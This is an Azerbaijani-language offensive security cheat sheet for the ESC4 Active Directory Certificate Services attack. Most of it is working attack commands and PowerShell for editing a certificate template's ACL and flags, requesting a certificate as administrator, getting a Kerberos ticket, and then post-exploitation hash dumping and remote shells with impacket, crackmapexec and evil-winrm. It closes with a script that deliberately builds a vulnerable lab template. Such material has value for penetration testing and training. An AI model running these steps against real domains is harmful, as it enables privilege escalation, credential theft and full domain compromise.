# ESC4 — Template Misconfigured Access Control

---

## ESC4 Nədir?

ESC4, sertifikat şablonunun **Access Control List (ACL)**-inin səhv konfiqurasiya
edilməsinə əsaslanır. Aşağı imtiyazlı bir istifadəçi və ya qrup şablon üzərində
`WriteProperty`, `WriteDACL` və ya `WriteOwner` kimi icazələrə malik olduqda,
şablonu modifikasiya edərək onu ESC1-ə çevirir və özü üçün sertifikat alır.

Bir sözlə: **şablon parametrlərini dəyişdirmək** hüququ varsa → şablonu
vulnerable hala gətir → exploit et → geri qaytar (opsional).

---

## Lazımi Şərtlər

```
Zəif ACL            -    Aşağıdakılardan biri şablonda mövcuddur:
                           WriteProperty / GenericWrite / GenericAll /
                           WriteDACL / WriteOwner / FullControl
İstifadəçi          -    Domain Users, Authenticated Users və ya hər hansı geniş qrup
Şablon               -    CA-ya qoşulmuş, aktiv vəziyyətdə
StrongBinding       -    reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement    --->    0x0
```

### Kritik ACL Hüquqları

```powershell
GenericAll        -    Tam nəzarət (şablonu istənilən şəkildə dəyişdirir)
GenericWrite      -    Xüsusiyyətləri dəyişdirir (EKU, flags, v.s.)
WriteProperty     -    Xüsusi atributları dəyişdirir
WriteDACL         -    ACL-i dəyişdirir → özünə GenericAll verir
WriteOwner        -    Owner-i dəyişdirir → sonra WriteDACL/GenericAll alır
```

---

## ESC4 Enumeration

```powershell
# Certipy — zəif ACL olan şablonları aşkar edir
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

# Certify.exe
Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

---

## ESC4 Enumeration With LDAP

```powershell
# Bütün sertifikat şablonlarını DACL ilə birlikdə siyahıla
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  name nTSecurityDescriptor

# PowerShell — şablon ACL-ini oxu
$templatePath = "AD:\CN=VulnESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,$(Get-ADRootDSE | Select -Expand configurationNamingContext)"
(Get-Acl $templatePath).Access | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType
```

---

## ESC4 Exploitation with Certipy

```powershell
certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -template 'VulnESC4' \
    -save-old -ldap-scheme ldap

# Step 1 — Şablonun mövcud konfiqurasiyasını yedəklə
certipy-ad req -u 'test@certificate.local' \
  -p 'sako2005!' \          
  -dc-ip 192.168.0.150 \     
  -target WIN-CERTIFICATE.certificate.local \
  -ca 'certificate-WIN-CERTIFICATE-CA' \
  -template 'VulnESC4' \
  -upn 'administrator@certificate.local'

# Step 2 — Auth
certipy-ad auth \
  -pfx 'administrator.pfx' \
  -username 'administrator' \
  -domain 'certificate.local' \
  -dc-ip 192.168.0.150
```

---

## ESC4 Exploitation With PowerShell (Manual)

```powershell
# Step 1 — Şablon üzərindəki ACL-i yoxla
$configNC    = (Get-ADRootDSE).configurationNamingContext
$templateDN  = "CN=VulnESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
(Get-Acl "AD:\$templateDN").Access | Format-Table IdentityReference, ActiveDirectoryRights

# Step 2 — Özünə GenericAll ver (WriteDACL varsa)
$acl         = Get-Acl "AD:\$templateDN"
$identity    = [System.Security.Principal.NTAccount]"DOMAIN\lowuser"
$adRights    = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type        = [System.Security.AccessControl.AccessControlType]::Allow
$rule        = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type)
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\$templateDN" -AclObject $acl

# Step 3 — CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag-ını əlavə et
Set-ADObject $templateDN -Replace @{
    "msPKI-Certificate-Name-Flag" = 1                   # ENROLLEE_SUPPLIES_SUBJECT
    "msPKI-Enrollment-Flag"       = 0                   # Manager approval yoxdur
    "pKIExtendedKeyUsage"         = "1.3.6.1.5.5.7.3.2" # Client Authentication
}

# Step 4 — SAN ilə sertifikat al
# (Certify.exe və ya certipy ilə davam et)
Certify.exe request /ca:"CA-Server\CA-Name" \
    /template:"VulnESC4" \
    /altname:"administrator"
```

---

## ESC4 Exploitation With Certify and Rubeus

```powershell
# Step 1 — Şablonu modifikasiya et (PowerShell ilə yuxarıdakı addımları icra et)

# Step 2 — Administrator adına SAN ilə sertifikat al
Certify.exe request /ca:"CA-Server\CA-Name" \
    /template:"VulnESC4" \
    /altname:"administrator"

# Convert PEM → PFX (Linux)
openssl pkcs12 -in admin_cert.pem \
    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out admin.pfx

# Step 3 — TGT al
Rubeus.exe asktgt /user:administrator \
    /certificate:admin.pfx \
    /password:'' /ptt

# Yoxla
klist
whoami /all
```

---

## Post Exploitation

```powershell
# SMB with NT Hash
impacket-psexec  -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

---

## Laboratory

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC4 Vulnerable Lab Setup Script
    Bir şablon yaradır:
      VulnESC4 — Domain Users qrupuna WriteProperty/WriteDACL hüququ verilir

.DESCRIPTION
    Şablon üzərindəki zəif ACL ESC4 hücumunu simulyasiya edir.
    Aşağı imtiyazlı istifadəçi şablonu modifikasiya edərək özünə
    SAN əlavəsi ilə sertifikat ala bilər.
    Kifayətsiz icazə halında SYSTEM kimi işlət:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC4Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# ── Config ────────────────────────────────────────────────────────────────────

$TemplateName = "VulnESC4"
$TemplateOID  = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.400"
$EnrollGroup  = "Domain Users"
$WriteGroup   = "Domain Users"   # Bu qrupa WriteProperty/WriteDACL veriləcək

# ── Helpers ───────────────────────────────────────────────────────────────────

function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

# ── Preflight ─────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ESC4 Lab Setup" -ForegroundColor Magenta
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Checking environment..."

try {
    $configNC     = (Get-ADRootDSE).configurationNamingContext
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "Cannot reach AD. Is this a Domain Controller?"
    exit 1
}

# ── Cleanup existing ──────────────────────────────────────────────────────────

$existing = Get-ADObject -Filter { Name -eq $TemplateName } -SearchBase $templatePath -ErrorAction SilentlyContinue
if ($existing) {
    Write-Warn "Existing '$TemplateName' template found. Removing..."
    try {
        certutil -SetCATemplates -$TemplateName 2>$null | Out-Null
        Remove-ADObject "CN=$TemplateName,$templatePath" -Confirm:$false -ErrorAction Stop
        Write-Ok "Old '$TemplateName' template removed."
    } catch {
        Write-Fail "Could not remove '$TemplateName': $_"
        Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC4Lab.ps1"
        exit 1
    }
}

# ── Create template ───────────────────────────────────────────────────────────
# Normal görünüşlü şablon — Client Auth EKU, manager approval yoxdur
# Lakin ACL-i kasıb istifadəçiyə WriteProperty/WriteDACL verir

Write-Step "Creating template: $TemplateName"

$attrs = @{
    "displayName"                          = $TemplateName
    "msPKI-Cert-Template-OID"              = $TemplateOID
    "msPKI-Certificate-Name-Flag"          = 0          # ENROLLEE_SUPPLIES_SUBJECT yoxdur (hələ)
    "msPKI-Enrollment-Flag"                = 0          # No manager approval
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16         # Exportable
    "msPKI-RA-Signature"                   = 0
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIExtendedKeyUsage"                  = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $TemplateName -Path $templatePath -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrs -ErrorAction Stop
    Write-Ok "Template '$TemplateName' created."
} catch {
    Write-Fail "Failed to create template: $_"
    exit 1
}

# ── Grant Enroll to Domain Users ──────────────────────────────────────────────

Write-Step "Granting Enroll permission to '$EnrollGroup'..."

try {
    $acl  = Get-Acl "AD:\CN=$TemplateName,$templatePath"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        [System.Security.Principal.NTAccount]$EnrollGroup,
        "ExtendedRight",
        "Allow"
    )
    $acl.AddAccessRule($rule)
    Set-Acl -Path "AD:\CN=$TemplateName,$templatePath" -AclObject $acl -ErrorAction Stop
    Write-Ok "Enroll permission granted."
} catch {
    Write-Fail "Failed to set Enroll ACL: $_"
    exit 1
}

# ── Grant WriteProperty + WriteDACL to Domain Users (ESC4 vulnerability) ─────

Write-Step "Granting WriteProperty + WriteDACL to '$WriteGroup' (ESC4 misconfiguration)..."

try {
    $acl      = Get-Acl "AD:\CN=$TemplateName,$templatePath"
    $identity = [System.Security.Principal.NTAccount]$WriteGroup

    $ruleWrite = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $identity,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $ruleDACL = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $identity,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )

    $acl.AddAccessRule($ruleWrite)
    $acl.AddAccessRule($ruleDACL)
    Set-Acl -Path "AD:\CN=$TemplateName,$templatePath" -AclObject $acl -ErrorAction Stop
    Write-Ok "WriteProperty + WriteDACL granted to '$WriteGroup'."
} catch {
    Write-Fail "Failed to set WriteProperty/WriteDACL ACL: $_"
    exit 1
}

# ── Add template to CA ────────────────────────────────────────────────────────

Write-Step "Adding '$TemplateName' to CA..."

$result = certutil -SetCATemplates +$TemplateName 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Ok "'$TemplateName' added to CA."
} else {
    Write-Warn "certutil failed, trying Add-CATemplate..."
    try {
        Add-CATemplate -Name $TemplateName -Force -ErrorAction Stop
        Write-Ok "'$TemplateName' added via Add-CATemplate."
    } catch {
        Write-Fail "Could not add '$TemplateName' to CA: $_"
        exit 1
    }
}

# ── Restart CertSvc ───────────────────────────────────────────────────────────

Write-Step "Restarting CertSvc..."
Restart-Service -Name CertSvc -Force
Start-Sleep -Seconds 5
Write-Ok "CertSvc restarted."

# ── Summary ───────────────────────────────────────────────────────────────────

$domain = (Get-ADDomain).DNSRoot
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress

Write-Host ""
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  ESC4 Lab Ready" -ForegroundColor Green
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Template     : $TemplateName" -ForegroundColor White
Write-Host "    EKU        : Client Authentication" -ForegroundColor White
Write-Host "    Vuln ACL   : WriteProperty + WriteDACL → Domain Users" -ForegroundColor White
Write-Host ""
Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
Write-Host ""
Write-Host "  # Step 1 — Şablonu yedəklə və ESC1-ə çevir" -ForegroundColor DarkGray
Write-Host "  certipy template -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -template '$TemplateName' \`" -ForegroundColor Cyan
Write-Host "      -save-old -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 2 — Administrator adına SAN ilə sertifikat al" -ForegroundColor DarkGray
Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' -template '$TemplateName' \`" -ForegroundColor Cyan
Write-Host "      -upn 'administrator@$domain' -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 3 — Authenticate" -ForegroundColor DarkGray
Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 4 — Şablonu bərpa et (opsional)" -ForegroundColor DarkGray
Write-Host "  certipy template -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP -template '$TemplateName' \`" -ForegroundColor Cyan
Write-Host "      -configuration $TemplateName.json -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
```
